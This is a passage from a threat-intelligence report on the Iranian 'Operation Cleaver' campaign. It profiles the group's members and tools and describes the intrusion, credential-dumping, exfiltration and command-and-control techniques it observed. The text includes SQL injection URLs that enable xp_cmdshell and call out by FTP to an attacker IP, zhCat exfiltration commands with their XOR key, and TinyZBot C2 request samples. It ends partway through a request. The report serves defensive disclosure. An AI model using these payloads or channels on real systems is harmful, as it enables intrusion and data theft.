Research).OPERATION\nCLEA VER\n26 5468696e6b204576696c2c20446f20476f6f64MEMBERS\nDuring this investigation, we were able to compile a considerable amount of information on some of \nthe members of this organization. The following proﬁles were built from reverse engineering, code \nanalysis, open source intelligence, incident response and forensics work. Personally identiﬁable \ninformation about these members is not being shared publicly as it could endanger their lives and \nwould be irresponsible.\nParviz\nParviz is a developer who worked on a variety of projects, and was primarily active in 2013. His \ndevelopment skillset is based around his ability to develop in C/C++. He has been observed using \nVisual Studio 2010, and his tools are written exclusively for Windows. Some of his tools were found \nto be packed with ASPack.\nParviz is the primary developer of the PVZ bot and multiple parts of its tool chain. Parviz is likely \nassociated with the PVZ bot as his name in hardcoded into the PDB ﬁle paths.\nThe PVZ tool chain includes a variety of functionality, such as HTTP command and control \ncommunications with an ASPX server-side component, a denial of service tool they developed, and \nthe public project named XYNTService used to run ordinary applications as services. \nPDBs\n• C:\\Users\\parviz\\documents\\visual studio 2010\\Projects\\BotManager\\   \nRelease\\BotManager.pdb\n• C:\\Users\\parviz\\Documents\\Visual Studio 2010\\Projects\\socket-test\\   \nRelease\\socket-test.pdb\n• C:\\Users\\parviz\\Documents\\Visual Studio 2010\\Projects\\\nXYNTServiceProject\\XYNTServiceProject\\Debug\\XYNTService.pdb\n• C:\\Users\\Parviz\\documents\\visual studio 2010\\Projects\\SendModule\\   \nRelease\\SendModule.pdb#OP CLEA VER\n27\n5468696e6b204576696c2c20446f2ff0476f6f4\nNesha\nNesha is one of the offensive members of this organization. Nesha was seen in breaches involving \nSQL injection as well as other techniques. Nesha often utilized web-based backdoors developed \nin ASPX, PHP as well as ColdFusion. A copy of an MS08-067 exploit developed in Python was \nrecovered in which Nesha shamelessly replaced the original author’s name with his own.\nNesha’s passwords very commonly include  own handle. His passwords were frequently stored \nas hashes in backdoors, but common hash cracking methods were able to recover the plaintext \nversions. His observed password use is as follows:\n•    nesha nesha  used as password in ColdFusion backdoors\n•    NeshaNesha12  used as password in ASPX backdoors.\n•    nesha123  was found as a password in a recovered credential ﬁle with unknown association\nCylance observed Nesha participating in compromises involving the following techniques:\n•    SQL injection\n•    Web backdoors\n•    Cached credential dumping\nNesha has additionally been identiﬁed using a variety of internally developed tools as well as the \nfollowing publicly available tools:\n•    Cain & Abel\n•    PsExec\n•    PLink\n•    NetCat\nAlireza\nAlireza appears to be one of the senior developers of this organization. His tools are commonly \ndeveloped in C++, Java, and C# (desktop and ASPX). These tools are often support tools, either \nmonitoring the activity of other tools or supplementing the function of other tools gathering \ninformation during the inﬁltration process. Alireza’s code appears to be reused internally on \nprojects such as TinyZBot. Alireza appears to be using a version control system for his code, and \nit is likely that others are using the same system. Based on the paths, the version control system in \nuse is likely Apache’s Subversion. Use of a version control system is indicative of code sharing, but \nthe use of an older system like Subversion, along with other evidence, suggests there is not a large \namount of collaboration on projects and likely one developer working on each project at a time. \nThis is not behavior typical of a professional development team.OPERATION\nCLEA VER\n28 5468696e6b204576696c2c20446f20476f6f64Alireza (cont.)\nAlireza’s C# tools include the following techniques:\n•    Querying Windows Management Instrumentation Command-line (WMIC)\n•    Cached credential dumping\n•    Generating ASPX shells\n•    Encryption\n•    Process enumeration \nAlireza’s Java tools include the following techniques:\n•    HTTP communications\n•    GUI development\nAlireza’s C++ tools include the following techniques:\n•    WinPcap interface\n•    ARP poisoning\n•    HTTP communications\n•    SMB communications\nPDBs\n• C:\\Users\\alireza\\Documents\\Visual Studio 2010\\CPPProjects\\IDCSercive\\\ntrunk\\Release\\kagent.pdb\n• C:\\Users\\alireza\\Documents\\Visual Studio 2010\\CPPProjects\\\nPcapServiceInstaller\\Release\\PcapServiceInstaller.pdb\n• C:\\Users\\alireza\\Documents\\Visual Studio 2010\\Projects\\\nAntiVirusDetectorConsole\\AntiVirusDetectorConsole\\obj\\x86\\Release\\\nAntiVirusDetectorConsole.pdb\n• C:\\Users\\alireza\\Documents\\Visual Studio 2010\\Projects\\\nmimikatzWrapper\\mimikatzWrapper\\obj\\x86\\Debug\\mimikatzWrapper.pdb\n• C:\\Users\\alireza\\Documents\\Visual Studio 2010\\Projects\\ShellCreator2\\\nShellCreator2\\obj\\x86\\Debug\\ShellCreator2.pdb\n• c:\\Users\\alireza\\Documents\\Visual Studio 2012\\Projects\\BackDoorLogger\\\nBackDoorLogger\\obj\\Debug\\BackDoorLogger.pdb#OP CLEA VER\n29\n5468696e6b204576696c2c20446f2ff0476f6f4\nkaJ\nkaJ is a .NET developer, and has only been observed working in C#. He has less English language \nproﬁciency than others in the organization, and likely has a supplemental role during compromises. \nHe has been observed developing tools which cater to speciﬁc challenges in a compromise. His \nnotable project was named Net Crawler, and a technical analysis of this tool can be found in the \nTactics, Techniques and Procedures  section. Thanks to a recovered test conﬁguration for Net \nCrawler, we were able to determine that kaJ’s development computer has the name dev-castle , \nwhere he has the username kaJ and the password oaolrJ@vad . kaJ is believed to be the creator \nof the Zhoupin ASCII art displayed in Net Crawler.\nkaJ’s projects include the following techniques.\n•     Interfacing with multiple cached credential dumping tools\n•     Interfacing with PsExec\n•     Worming behavior\nJimbp\nJimbp is a .NET developer with minimal experience. His projects appear to be supplemental to \nTinyZBot and are very simplistic. It is believed he is the developer of the project Binder_1 .  This \nproject was a simple malware binder which required manual conﬁguration when compiling. His \nother work included creating a new service wrapper for TinyZBot.\nPDBs\n• c:\\Users\\Jimbp\\Desktop\\Binder_1\\Binder_1\\obj\\x86\\Release\\Setup.pdb\n• c:\\Users\\Jimbp\\Desktop\\Binder_1 - for cleaver\\Binder_1\\obj\\x86\\\nRelease\\Setup.pdb\n• c:\\Users\\Jimbp\\Documents\\Visual Studio 2013\\Projects\\\nTestForInstallingService\\TestForInstallingService\\obj\\Release\\\nTestForInstallingService.pdbOPERATION\nCLEA VER\n30 5468696e6b204576696c2c20446f20476f6f64TEAMS\nOf course many associated Iranian hacker teams have been identiﬁed in public and private \nsecurity circles. Some of the teams publicly known today include Iranian Cyber Army, Ashiyane, \nIslamic Cyber Resistance Group, Izz ad-Din al-Qassam Cyber Fighters, Parastoo, Shabgard, Iran \nBlack Hats and many others9. \nHowever, even though the TTPs of the Cleaver team have some overlap to techniques used by \nIranian Cyber Army (botnets), Ashiyane (SQL injection) and Syrian Electronic Army (phishing and \nRATs), we believe this is largely the work of a new team. Some connections to Ashiyane were \ndiscovered in our investigations including a reference to hussein1363 , who had prior ties to \nthe hacker group. Additional connections between team members and individuals exist but are \npredominantly speculative and have only been shared with law enforcement.\nUltimately we believe the Cleaver team is a mix of existing team members and new recruits \npulled from the universities in Iran.#OP CLEA VER\n31\n5468696e6b204576696c2c20446f2ff0476f6f4\nTTP COVER HERE\nTACTICS, TECHNIQUES\n#OP CLEA VER& PROCEDURES5468696e6b204576696c2c20446f20476f6f64OPERATION\nCLEA VER\n32 5468696e6b204576696c2c20446f20476f6f64TACTICS, TECHNIQUES & PROCEDURES\nThe Cleaver campaign used a variety of methods in multiple stages of attacks. In this section we’ll \ncover the commonly observed methods during different stages of the attack.\nINITIAL COMPROMISE\nThe initial compromise gets the attackers their ﬁrst foothold into the target network. Once the \nability to execute arbitrary code has been established, an attacker’s job becomes quite a bit \neasier. Since the vector of initial compromise is usually determined by what is vulnerable on the \ntarget, we’ll cover just a few of the techniques we’ve seen Operation Cleaver use to initiate the \ncompromise.\nSQL Injection\nSQL injection is a very common and simple attack method. It is made possible by a lack of input \nsanitization by the vulnerable application before supplying that input into a SQL database query. \nSQL injection payloads used by this organization have been double encoded. Double encoding \nSQL injection payloads allows for bypassing of various anti-exploitation ﬁlters, such as those \nsupplied by Web Application Firewalls (WAFs).\nThe attackers would enable xp_cmdshell :\n \nhttp://localhost/Demos/demo.cfm?Edit%26ID=111;declare%20@b1%20varchar(8000);set%20@\nb1=%20show advanced options;declare%20@b2%20varchar(8000);set%20@b2=%20xp_\ncmdshell;%20EXEC%20master.dbo.sp_configure%20@b1,%201;RECONFIGURE;EXEC%20master.dbo.\nsp_configure%20@b2,%201;RECONFIGURE;--%20\n \nThen connect outbound via anonymous FTP:\n \nhttp://localhost/Demos/demo.cfm?Edit%26ID=111;declare%20@b1%20varchar(8000);set%20@\nb1=%20ftp -A 108.175.152.230;%20exec%20master..xp_cmdshell%20@b1--%20\nSpear-Phishing Campaign\nUsing messaging methods such as email, attackers can social engineer users into downloading \nand executing software, which quietly installs malware alongside of the desired program. \nOperation Cleaver has employed this technique numerous times across different organizations.#OP CLEA VER\n33\n5468696e6b204576696c2c20446f2ff0476f6f4\nEasyResumeCreatorPro.com\nThe domain EasyResumeCreatorPro.com was registered and a website setup which was a direct \ncopy of a legitimate website at winresume.com . This is how the original site looked:\nThat’s not all they copied. In order to infect users, they combined the original Easy Resume Creator \nPro product with malware by using a binder they developed internally named Binder_1 . A binder \nis an application, which combines two executables (desired software and malware) into a single \nexecutable. \nThe resulting executable masquerades as the desired software. The purpose is deception, to make \nthe binder indistinguishable from the desired application. When executed, both applications are \nwritten to a temporary directory and executed. This way it appears that the desired application was \nexecuted, but the malware was also executed silently.\nFigure 14:  The original Easy Résumé Creator Pro website on winresume.com is legitimate.\nFigure 15:  The fraudulent website, easyresumecreatorpro.com, is a fraudulent copy of the Easy \nResume Creator Pro website to lure job candidates to download and install their TinyZBot agent.OPERATION\nCLEA VER\n34 5468696e6b204576696c2c20446f20476f6f64Teledyne Résumé Submitter\nThis attack evolved to appear more legitimate. The \nattackers made the victims feel like they had a pending \njob opportunity at the industrial conglomerate Teledyne. In \norder to take advantage of this job opportunity, the victim \nneeded to use the fake résumé submission application \nsupplied by the malicious recruiter. Multiple domains were \nregistered in order to make the download sites seem more \nrealistic. These domains included other companies as they \ntried to hit a wider audience.\n• Teledyne-Jobs.com\n• Doosan-Job.com\n• NorthropGrumman.net\nAt this point, the résumé submission application checks the \nInternet connection. If it is unable to connect to the Internet, \nit will display a window to input proxy information.\nWhen this information is entered, the results are cached \nin a location the dropped malware can access. After an \nInternet connection is ensured, the malware (TinyZbot) is \ndropped and executed. This clever scheme makes sure the \nmalware can connect to the command and control server, \nand increases the chances that domain credentials are \ncached on the now infected machine. Shortly after, the main \napplication is launched.\nFigure 16:  When the résumé submitting \napplication is executed, a splash screen is \ndisplayed. \nFigure 17: Unable to connect to the Internet, the \ntool prompts the user for proxy conﬁguration \ninformation.\nFigure 18:  Final résumé submission form\ndisplays to the user while the malware runs \nfreely in the background.#OP CLEA VER\n35\n5468696e6b204576696c2c20446f2ff0476f6f4\nTeledyne Résumé Submitter (cont.)\nThe ﬁrst résumé submission form requests contact information. This form, like the rest of the \nsubmission forms, only stores the submitted information while the application is running. As the \ninfected user is going through and ﬁlling out all this information, the malware is running in the \nbackground, logging their keystrokes, retrieving their stored passwords, etc. Once all the forms are \nﬁlled out, the user goes to the submission form.\nWhen the victim hits submit, the résumé submitter does a GET request to microsoft.com  in order \nto make it seem like it is submitting something, then claims success.\nThis method is particularly effective not only because of its level of deception, but even if the victim \nsuspects that they are infected with malware, they are not as likely to speak up about it, as they \nwould need to explain why they were submitting a job application for another company.\nFigure 19:  GET request to www.microsoft.com fakes the résumé submission.OPERATION\nCLEA VER\n36 5468696e6b204576696c2c20446f20476f6f64PRIVILEGE ESCALATION & PIVOTING\nPrivilege escalation is a category of techniques that describe the process of going from a less \nprivileged user on a compromised computer to a more privileged user. This increase in privileges \nallows for the attacker to gain access to privleged areas of the operating system as well as to \ninfect other computers on the target network.\nThis team did not utilize any novel methods of privilege escalation, but they were observed \nusing a variety of publicly known exploits. PrivEsc is a compiled exploit, which leverages \nthe vulnerability commonly referred to as KiTrap0D  (CVE-2010-0232). The exploit allows for \nescalation of privileges on unpatched Windows operating systems from an unprivileged user to \nkernel-level privilege. \nThis vulnerability and the corresponding exploit were discovered and developed in 2010. \nThe plagiarized version used in Operation Cleaver was compiled in May 2013, with a slight \nmodiﬁcation to the public source code. This modiﬁcation changed the author’s details to Zhopin \nExploit Team .\nPivoting is the process of leveraging access from one compromised computer in order to gain \naccess to additional systems on the target network. This can involve launching attacks from the \ncompromised computer, or simply abusing access once it has been gained.\nCached Credential Dumping\nA very common method of pivoting on a predominantly Windows operating system based \nnetwork is to extract domain credentials which have been used on the compromised computer \nfrom a credential cache. There are a few well-known tools which are capable of doing this given \nsufficient privileges on the infected host. Two of these tools used by Cleaver are Mimikatz and \nWindows Credential Editor.\nzhMimikatz and MimikatzWrapper\nTwo similar applications were developed by Operation Cleaver in order automate the execution \nof Mimikatz. These applications are zhMimikatz and MimikatzWrapper. These applications store \nmultiple versions of Mimikatz in their resources. When executed, they determine which version \nof Mimikatz to use based on whether the computer’s version of Windows is 32-bit or 64-bit. This \ntechnique is uncommon in malware and shows the advanced skillset of the Cleaver team. Both \ntools were developed in C#.#OP CLEA VER\n37\n5468696e6b204576696c2c20446f2ff0476f6f4\nzhMimikatz and MimikatzWrapper (cont.)\nIn the following examples, the computer name is TheComputerName , the username of the \nlogged in user is TheUser, and that user’s password is ThePassword . At the time of execution,\nthe system only has its own credentials available and no cached network credentials.\nzhMimikatz\nzhMimikatz executes the correct version of Mimikatz for the current system, and parses the results \nfor any cached credentials.\nFigure 20:  zhMimikatz OPERATION\nCLEA VER\n38 5468696e6b204576696c2c20446f20476f6f64MimikatzWrapper\nOutput from MimikatzWrapper is essentially the same as zhMimikatz, despite being a different \nVisual Studio project.\nThe only external difference is that MimikatzWrapper also logs these results to r es.txt in the \nexecuting directory. This can make it useful for tools like the PVZ tool chain and Csext to execute \nwith logged results:\nFigure 22:  The MimikatzWrapper dumps credentials out to a ﬁle.Figure 21:  The MimikatzWrapper.#OP CLEA VER\n39\n5468696e6b204576696c2c20446f2ff0476f6f4\nPsExec Spreading\nOnce an attacker has credentials extracted from the cache, whether in hash form or in plaintext \nform, PsExec can be used to run commands on any other computer which accepts those domain \ncredentials. If this technique is combined with cached credential dumping, it can be used to jump \nfrom computer to computer on a compromised network.\nNetC (Net Crawler)\nNet Crawler utilizes a cached credential dumping technique along with PsExec in order to \nworm throughout a network, collecting any and all credentials that it can extract from credential \ncaches. It has the ability to do this with both Windows Credential Editor and Mimikatz. It starts by \nﬁrst extracting cached credentials from the infected computer’s cache. Once this is complete, it \nthen continues to scan a set of conﬁgured IP addresses on the local subnet to determine which \nIP addresses have SMB related ports open. Then an iterative methodology is applied to brute \nforcing each SMB enabled target with each credential that was extracted from the cache. \nWhen a positive result has been achieved, it will create a copy of itself with a modiﬁed \nconﬁguration stored as a PE resource, then send and execute the copy utilizing PsExec. This \ncopy repeats the behavior of the original, but with already discovered credentials as well as \nnewly discovered ones on the newly infected host. Any credentials found are reported back to \nthe original infection.OPERATION\nCLEA VER\n40 5468696e6b204576696c2c20446f20476f6f64NetC (Net Crawler) cont.\nThe following is a sample of some of the recovered results of Net Crawler executing on a live \nnetwork:\nA more in depth analysis of Net Crawler, as part of the A Study in Bots  series, will be available on \nCylance’s blog.Figure 23:  The real output of a successfully run NetC effort at a victim organization.\n#OP CLEA VER\n41\n5468696e6b204576696c2c20446f2ff0476f6f4\nMS08-067 Exploit\nMS08-067 is a vulnerability in Microsoft Windows made popular by the Conﬁcker worm which can \nbe exploited by a specially crafted packet to the operating system’s RPC network interface. This \nvulnerability has been patched since October 2008, but many networks have failed to update their \nsystems even to this day. \nOperation Cleaver used a plagiarized version of a publicly available exploit for this vulnerability\ndeveloped in Python. Someone in the Cleaver team (presumed to be Nesha) modiﬁed the exploit to \nread “ By Nesha ”.\nJasus\nJasus is an ARP cache poisoner developed by the Operation Cleaver team. It makes use of \nWinPcap and is developed in C. Compared to some other publicly available ARP cache poisoning \nutilities, Jasus is poorly developed and without many useful features. The primary positive attribute \nof Jasus is its poor detection ratio by the antivirus industry.\nCain & Abel\nCain & Abel is a publicly available toolkit, which covers a wide range of functionality that assists \nattackers once they have compromised a node on a network. It has the ability to dump stored and \ncached credentials, and conduct attacks like ARP cache poisoning in order to capture credentials \nbeing transmitted on the network. It also has a remotely installable trojan named Abel, which \nenables some of its functionality on a remote target.\nWe observed the Operation Cleaver team using Cain & Abel for extracting credentials from caches \nand the network when they are conﬁdent that there is little to no antivirus protection on the infected \ntarget.\nEXFILTRATION\nExﬁltration is the process of moving information to an external site. In this context, it is the process \nof stealing information without being detected. Operation Cleaver has a strong focus on stealing \nconﬁdential/privileged information, and they have utilized a few methods in order to facilitate this \nobjective.OPERATION\nCLEA VER\n42 5468696e6b204576696c2c20446f20476f6f64Anonymous FTP Servers\nCleaver Operations observed in 2013 mainly utilized FTP servers with anonymous access \nenabled in order to pilfer large quantities of information. This allowed them to use existing \ncommand line utilities available on their targets in order to upload information. This is a versatile \ntechnique as it does not require any additional software which could be detected. These \nFTP servers were also observed during the infection process, as infected computers were \noften instructed to download additional ﬁles from these FTP servers, including backdoors and \npivoting tools.\nThe following IP addresses hosted FTP servers that were used in the infection of targets or in \nthe exﬁltration of information.\n• 108.175.152.230 – Santa Rosa, CA, USA\n• 108.175.153.158 – Santa Rosa, CA, USA\n• 184.82.181.48 – Pilot Mountain, North Carolina, USA\n• 203.150.224.249 - Thailand\n• 64.120.208.74 - Pilot Mountain, North Carolina, USA\n• 64.120.208.75 - Pilot Mountain, North Carolina, USA\n• 64.120.208.76 - Pilot Mountain, North Carolina, USA\n• 64.120.208.78 - Pilot Mountain, North Carolina, USA\n• 66.96.252.198 - Pilot Mountain, North Carolina, USA\nNetCat\nNetCat is a network tool which has many valid purposes but can also be used for malicious \npurposes. Its main functionality allows for a client and server communication channel, allowing \nfor information to be transported over the network simply. NetCat has an option when being \ncompiled to enable or disable the ability for NetCat to execute a command after the connection \nis established. This feature can be abused to enable a reverse connecting shell, which can be \nused to remotely control a target. \nNetCat’s network communications are in plaintext, and could be viewed by an egress ﬁlter \nlooking to block the exﬁltration of sensitive information. The Operation Cleaver team was \nobserved attempting to use NetCat to exﬁltrate information as well as use it as a reverse \nconnecting shell. The use of NetCat was later replaced with zhCat.\n #OP CLEA VER\n43\n5468696e6b204576696c2c20446f2ff0476f6f4\nzhCat\nzhCat is a tool developed by the Operation Cleaver team which operates similarly to NetCat. Its \nmain purpose is to create a channel that is capable of transporting information over the network. \nThe changes made in zhCat allow for this information to be transferred with inline obfuscation and/\nor encryption. This makes it more difficult to detect that privileged information is being exﬁltrated.\nThe command line help (of a particular version) shows the following options:  \nMultiple obfuscation/encryption methods are available. The –h argument enables HTTP mode. \nThis makes the traffic between zhCat instances look like benign HTTP traffic. For instance, if the \nattackers set up a zhCat instance listening on port 1000 on 192.168.116.128  in HTTP mode, the \nclient instance of zhCat would use the following command:\nzhcat.exe –h –p 1000 –i 192.168.116.128\nThe server instance would use the following command:\nzhcat.exe –l –h –p 1000\nWhen we run both of these, we can send information just by typing it into the terminal of the \nrunning application. Information can be supplied by standard input.\nOPERATION\nCLEA VER\n44 5468696e6b204576696c2c20446f20476f6f64zhCat (cont.)\nIf we observe the network communications during this transfer, we can see the following HTTP \nPOST request.\nNote: research into ebizmba.com  did not turn up any additional evidence of being involved \nwith the development of zhCat.\nOn the server side, we can see our message has been received:\nIf stricter egress ﬁltering is enabled, the attackers can use zhCat to also XOR encrypt the traffic \nwith a shared key. These keys are stored inside zhCat. The following is the key used for XOR \nencryption:\nSorry! The handle to file %s is not a valid handle any more.\\nSorry! \nThe handle to file %s is not a valid handle any more.\nThe \\n represents hex character 0x0A, which is a new line character.\nAn attacker could set up a server instance of zhCat with the following command in order to \nenable both HTTP and XOR obfuscation:\nzhcat.exe –h –p 1000 –l –x\nThe client instance could then be invoked with the following command:\nzhcat.exe –h –p 1000 –i 192.168.116.128 –x\nOnce again, information can be supplied via standard input.\n#OP CLEA VER\n45\n5468696e6b204576696c2c20446f2ff0476f6f4\nzhCat (cont.)\nUpon inspecting the network traffic again, we see the following HTTP POST request.\nOn the server side, we can see this information being received:\nzhCat has a variety of other features such as port mirroring as well as traffic redirecting.\nPLink\nPLink is one of the many utilities provided in the PuTTY (SSH) suite, which has many benign \npurposes. It is capable of communicating over various protocols, the most notable being SSH. \nThe SSH protocol is a heavily utilized encrypted protocol, most commonly used for remote \nadministration of UNIX based operating systems. PLink is designed to implement some of the \nSSH functions related to forwarding traffic as well as other functionality.\nOperation Cleaver uses PLink to forward local RDP ports to remote SSH servers. This allows them \nto easily connect to RDP servers inside the networks of their victims. These RDP connections can \nbe used to exﬁltrate information visually, as well as to remotely control the computers hosting the \nRDP servers.\nOPERATION\nCLEA VER\n46 5468696e6b204576696c2c20446f20476f6f64SMTP\nEarly Cleaver operations abused SMTP in order to exﬁltrate information. The sending is \nperformed by internally developed malware samples such as TinyZBot and Csext in order to \nexﬁltrate information about the infected computer, as well as requested ﬁles and keystroke \nlogging information. Messages were sent using an open SMTP relay at BeyondSys.com  with \nthe sender email address dyanachear(at)beyondsys.com . This allowed the attackers to use \ninfrastructure that was not theirs to exﬁltrate information. The known recipient addresses of this \ninformation were testmail_00001(at)yahoo.com  and TerafficAnalyzer(at)yahoo.\ncom. In order to deceive anyone reading these emails, they made them appear to be a spam \nmessage that most would not think twice about. The subject used is the following:\nNo Prescription required. Viagra Dosages: 25, 100, 150mg. \nFast worldwide delivery.\nThe message used is the following:\nBuy Viagra150mg x 50 tablets for only $124.99!\nNo Prescription required. Viagra dosages: 150, 100, 25mg. Fast \nWorldwide Delivery.\nSee the attachment movie.\nFree bonus trip.\nbestviagra4u.cn\nThe ﬁles being exﬁltrated are added to the email as attachments.\nSOAP\nSOAP is a sub-protocol communicated via HTTP. In relation to Operation Cleaver, it is used as the \ncommand and control protocol for TinyZBot, which was the preferred backdoor, and underwent \nlong-term development. HTTP communications are often used by botnets, but it is uncommon \nto use a sub-protocol such as SOAP. It is likely that SOAP was used because it is simple to \nimplement in C#, and has the added beneﬁt of blending in with other benign HTTP traffic.\nAs part of TinyZBot’s command and control protocol, ﬁles can be exﬁltrated over SOAP to the \ncommand and control server. For more information about TinyZBot, see the Persistence  section.#OP CLEA VER\n47\n5468696e6b204576696c2c20446f2ff0476f6f4\nPERSISTENCE\nPersistence is the means of maintaining access to a compromised network. There are limitless \nmethods of persistence; the following are techniques and tools for persistence used by Cleaver.\nTinyZBot\nTinyZBot is a backdoor developed in C#. This bot is the longest developed malware we have \nanalyzed from this organization. The earliest known version was compiled in January 2013 and \nwe continued to see new versions being created actively. The purpose of TinyZBot is to gather \ninformation from an infected computer as well as maintain and further access into a compromised \nnetwork. \nTinyZBot was developed with the clear intention of targeted campaigns. The name TinyZBot is \nassumed to be referring to this project as a less versatile version of the ZeuS botnet, although \nit does not exhibit the major browser injection features of ZeuS. To be clear, TinyZBot shares \nno code with ZeuS or its variants, and is developed in a different programming language. The \nmajority of the code in TinyZBot was created by Cleaver.\nTinyZBot Features\nTinyZBot supports a wide array of features that continually evolved over time. For the evolution of \nfeatures, see the History  section. The following is a list of supported features:\n•    SMTP exﬁltration\n•    Log keystrokes\n•    Monitor clipboard activity\n•    Enable a SOAP-based command and control channel\n•    Self-updating\n•    Download and execute arbitrary code\n•    Capture screenshots\n•    Extract saved passwords for Internet Explorer\n•    Install as a service\n•    Establish persistence by shortcut in startup folder\n•    Provide unique malware campaign identiﬁers for tracking and control purposes\n•    Deceptive execution methods\n•    Dynamic backdoor conﬁguration\n•    FTP exﬁltration\n•    Security software detection\n•    Ability to disable Avira antivirus\n•    Ability to modify PE resources\n•    Dynamic plugin structureOPERATION\nCLEA VER\n48 5468696e6b204576696c2c20446f20476f6f64TinyZBot Command and Control Protocol\nThe command and control mechanism for TinyZBot utilizes SOAP communicating over HTTP. \nPotential reasons for using SOAP are: \n1. SOAP-based communications are simple to implement in C#. \n2. SOAP traffic could easily be considered benign traffic, as it is not commonly seen in malware.\nAs part of SOAP communications, a URI is speciﬁed. This is internal to the sub-protocol, and does \nnot necessarily reﬂect the URI of the host running the SOAP server (ASMX ﬁle). In the case of \nTinyZBot, and many examples for developing SOAP applications, this URI is tempuri.org .\nSince the ﬁrst version of the SOAP-based command and control protocol was implemented, \nTinyZBot used what is referred to as a “dynamic password”. The result of this is a \ncryptographically hashed version of the server time (which must be obtained through a SOAP \nquery), the TinyZBot’s GUID, and the TinyZBot’s AppUsageID  (campaign identiﬁer).\nFor the command and control examples below, red text represents TCP data sent from the \nTinyZBot infection while blue text  represents TCP data sent from the command and control \nserver. The server time lookup query invokes the SOAP command GetServerTime .\nPOST /checkupdate.asmx HTTP/1.1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol 2.0.50727.1433)\nContent-Type: text/xml; charset=utf-8 \nSOAPAction: “http://tempuri(dot)org/GetServerTime” \nHost: microsoftactiveservices(dot)com \nContent-Length: 291 \nExpect: 100-continue\nConnection: Keep-Alive\nHTTP/1.1 100 Continue\n<?xml version=”1.0” encoding=”utf-8”?><soap:Envelope \nxmlns:soap=”http://schemas.xmlsoap.org/soap/envelope/” xmlns:xsi=”http://www.w3.org/2001/\nXMLSchema-instance” \nxmlns:xsd=”http://www.w3.org/2001/XMLSchema”><soap:Body><GetServerTime xmlns=”http://tempuri.\norg/” /></soap:Body></soap:Envelope>\nHTTP/1.1 200 OK \nCache-Control: private, max-age=0 \nContent-Type: text/xml; charset=utf-8 \nServer: Microsoft-IIS/7.5 \nX-AspNet-Version: 2.0.50727 \nX-Powered-By: ASP.NET \nDate: Mon, 06 Oct 2014 13:36:47 GMT \nContent-Length: 392  #OP CLEA VER\n49\n5468696e6b204576696c2c20446f2ff0476f6f4\nTinyZBot Command and Control Protocol (cont.)\n<?xml version=”1.0” encoding=”utf-8”?><soap:Envelope \nxmlns:soap=”http://schemas.xmlsoap.org/soap/envelope/” xmlns:xsi=”http://www.w3.org/2001/\nXMLSchema-instance” \nxmlns:xsd=”http://www.w3.org/2001 XMLSchema”><soap:Body><GetServerTimeResponse xmlns=”http://\ntempuri.org/”><GetServerTimeResult>2014-10-06T13:36:47.2193601Z</GetServerTimeResult></\nGetServerTimeResponse></soap:Body></soap:Envelope>\nThis is the ﬁrst query done by a running TinyZBot instance, and needs to be done shortly before \nmost other queries, in order to update the dynamic password.\nCommands, updates and ﬁles to drop and execute are stored as ﬁles on the SOAP server, and \naccess is restricted by the AppUsageID as well as the bot GUID. This allows for commands to be \nsent to all bots for a campaign as well as individual control. The TinyZBot queries the server in \norder to enumerate all ﬁles currently available to it.\nPOST /checkupdate.asmx HTTP/1.1 \nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol 2.0.50727.1433) \nContent-Type: text/xml; charset=utf-8 \nSOAPAction: “http://tempuri(dot)org/GetFileList” \nHost: microsoftactiveservices(dot)com \nContent-Length: 425\nExpect: 100-continue\nHTTP/1.1 100 Continue\n<?xml version=”1.0” encoding=”utf-8”?><soap:Envelope xmlns:soap=”http://schemas.xmlsoap.org/\nsoap/envelope/” \nxmlns:xsi=”http://www.w3.org/2001/XMLSchema-instance” xmlns:xsd=”http://www.w3.org/2001/\nXMLSchema”><soap:Body><GetFileList xmlns=”http://tempuri(dot)org/”><Id>00cf6217-8c7e-4598-\nb155-65ebd949bba9</Id><AppType>XYZCO</AppType><IP /><Pass>abefc81</Pass><Version>BDFF;1.0.0</\nVersion></GetFileList></soap:Body></soap:Envelope>\nHTTP/1.1 200 OK Cache-Control: private, max-age=0 \nContent-Type: text/xml; charset=utf-8 \nServer: Microsoft-IIS/7.5 X-AspNet-Version: 2.0.50727\nX-Powered-By: ASP.NET Date: Mon, 06 Oct 2014 13:36:47 GMT \nContent-Length: 1474\n<?xml version=”1.0” encoding=”utf-8”?><soap:Envelope xmlns:soap=”http://schemas.xmlsoap.org/\nsoap/envelope/” \nxmlns:xsi=”http://www.w3.org/2001/XMLSchema-instance”\nxmlns:xsd=”http://www.w3.org/2001/XMLSchema”><soap:Body><GetFileListResponse xmlns=”http://\ntempuri.org/”>\n OPERATION\nCLEA VER\n50 5468696e6b204576696c2c20446f20476f6f64TinyZBot Command and Control Protocol (cont.)\n<GetFileListResult><string>[ALL]__b93c-49a1-140914084450__[0000000000000000000000000000\n0000].tmu</string><string>[ALL]__b93c-49a1-140914084612__[0000000000000000000000000000\n0000].tmu</string><string>[ALL]__b93c-49a1-140914084619__[00000000000000000000000000000\n000].tmu</string><string>[ALL]__b93c-49a1-140914084628__[00000000000000000000000000000\n000].tmu</string><string>[ALL]__b93c-49a1-140914084638__[00000000000000000000000000000\n000].tmu</string><string>[ALL]__b93c-49a1-140914084644__[00000000000000000000000000000\n000].tmu</string><string>[ALL]__b93c-49a1-140914084659__[000000000000000000000000000000\n00].tmu</string><string>[ALL]__b93c-49a1-140914084715__[0000000000000000000000000000000\n0].tmu</string><string>[ALL]__b93c-49a1-140914084732__[00000000000000000000000000000000\n].tmu</string><string>[ALL]__b93c-49a1-140914084741__[00000000000000000000000000000000].\ntmu</string><string>[ALL]__b93c-49a1-140914090807__[00000000000000000000000000000000].tmu</\nstring><string>[ALL]__b93c-49a1-140915103605__[00000000000000000000000000000000].tmu</\nstring><string>[ALL]__b93c-49a1-140915103610__[00000000000000000000000000000000].tmu</string></\nGetFileListResult></GetFileListResponse></soap:Body></soap:Envelope>\nIn order to download the ﬁle and parse for commands to execute, the TinyZBot must request the \nﬁle. The ﬁle is downloaded Base64-encoded inside of the SOAP response.\nPOST /checkupdate.asmx \nHTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol \n2.0.50727.1433)\nContent-Type: text/xml; charset=utf-8 \nSOAPAction: “http://tempuri(dot)org/GetFile”\n Host: microsoftactiveservices(dot)com \nContent-Length: 478\nExpect: 100-continue\nHTTP/1.1 100 Continue \n<?xml version=”1.0” encoding=”utf-8”?>\n<soap:Envelope xmlns:soap=”http://schemas.xmlsoap.org/soap/envelope/” 